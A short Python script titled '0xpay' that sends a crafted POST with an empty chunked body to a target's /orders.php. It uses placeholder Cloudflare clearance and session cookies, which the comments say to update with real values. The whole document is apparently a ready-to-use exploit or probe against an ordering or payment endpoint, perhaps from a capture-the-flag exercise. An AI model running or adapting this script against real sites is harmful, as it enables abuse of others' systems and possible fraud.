#0xpay
#Author: The Ents
#Instructions: update cf_clearence, sid

import http.client
import pprint
import sys

treegarth = sys.argv[1]
ents = http.client.HTTPSConnection(treegarth)                                           
hobbits = {'User-Agent': 'lotr', 'Cookie':'cf_clearance=update; sid=update;','Transfer-Encoding':'chunked'}

quickbeam = "0\r\n\r\n"
ents.request("POST", "/orders.php",quickbeam,hobbits)
treebeard = ents.getresponse()
print(treebeard.status, treebeard.reason)
potter = treebeard.read().decode('utf-8')
headers = treebeard.getheaders()
entings = pprint.PrettyPrinter(indent=4)
entings.pprint("Headers: {}".format(headers))
print(potter)
ents.close()
